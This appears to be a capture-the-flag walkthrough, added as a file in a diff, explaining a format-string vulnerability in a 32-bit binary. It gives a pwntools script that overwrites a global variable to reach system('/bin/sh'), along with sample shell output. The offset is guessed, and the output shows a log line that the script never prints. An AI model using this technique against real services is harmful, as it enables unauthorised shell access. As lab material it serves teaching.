@@ -1,0 +1,107 @@
+To solve this challenge using `pwntools`, you can exploit the format string vulnerability in the `printf(buf)` call. The vulnerability arises because the `printf` function is called with user-controlled input (`buf`) without a format specifier. This allows you to read and write arbitrary memory addresses.
+
+The goal is to overwrite the value of the variable `x` to `4` so that the program executes the `system("/bin/sh")` call, giving you a shell.
+
+Here are the steps and the corresponding code:
+
+---
+
+### Steps to Solve the Challenge:
+
+1. **Analyze the Binary**:
+   - The binary is a 32-bit ELF file.
+   - The `printf(buf)` call is vulnerable to a format string attack.
+   - The variable `x` needs to be set to `4` to trigger the shell.
+
+2. **Find the Address of `x`**:
+   - Use tools like `gdb` or `pwntools` to find the address of the variable `x` in memory.
+
+3. **Exploit the Format String Vulnerability**:
+   - Use the format string vulnerability to overwrite the value of `x` with `4`.
+
+4. **Trigger the Shell**:
+   - Once `x` is set to `4`, the program will execute `system("/bin/sh")`.
+
+---
+
+### Code to Solve the Challenge:
+
+```python
+from pwn import *
+
+# Set up the binary and context
+binary = './fmt'
+elf = ELF(binary)
+context.binary = binary
+context.log_level = 'debug'
+
+# Start the process
+p = process(binary)
+
+# Find the address of the variable `x`
+# Assuming `x` is a global variable, we can find its address using pwntools
+x_address = elf.symbols['x']
+log.info(f"Address of x: {hex(x_address)}")
+
+# Construct the payload
+# Use a format string to overwrite the value of `x` with `4`
+# The exact offset depends on the stack layout, which can be determined through trial and error
+offset = 6  # Adjust this based on your analysis
+value_to_write = 4
+payload = fmtstr_payload(offset, {x_address: value_to_write})
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+---
+
+### Explanation of the Code:
+
+1. **Binary Setup**:
+   - Load the binary using `pwntools` and set the context to 32-bit.
+
+2. **Find the Address of `x`**:
+   - Use `elf.symbols['x']` to get the address of the global variable `x`.
+
+3. **Construct the Payload**:
+   - Use `fmtstr_payload` from `pwntools` to generate a format string payload.
+   - The `offset` specifies the position of the user input on the stack.
+   - The `{x_address: value_to_write}` dictionary specifies the memory address to overwrite and the value to write.
+
+4. **Send the Payload**:
+   - Send the payload to the program using `p.sendline(payload)`.
+
+5. **Interact with the Shell**:
+   - Once the value of `x` is set to `4`, the program will execute `system("/bin/sh")`.
+   - Use `p.interactive()` to interact with the shell.
+
+---
+
+### Notes:
+
+- The `offset` value in the `fmtstr_payload` function depends on the stack layout. You can determine it by experimenting with different inputs and observing the program's behavior.
+- Use `gdb` or `pwndbg` to debug the binary and verify the address of `x` and the stack layout.
+- If the binary is running on a remote server, use `remote(host, port)` instead of `process(binary)`.
+
+---
+
+### Example Output:
+
+```bash
+$ python3 exploit.py
+[+] Starting local process './fmt': pid 12345
+[*] Address of x: 0x804a02c
+[*] Sending payload...
+[*] Switching to interactive mode
+running sh...
+$ whoami
+ctf-player
+$ cat flag.txt
+<flag>
+```
+
+This should give you a shell and allow you to retrieve the flag.
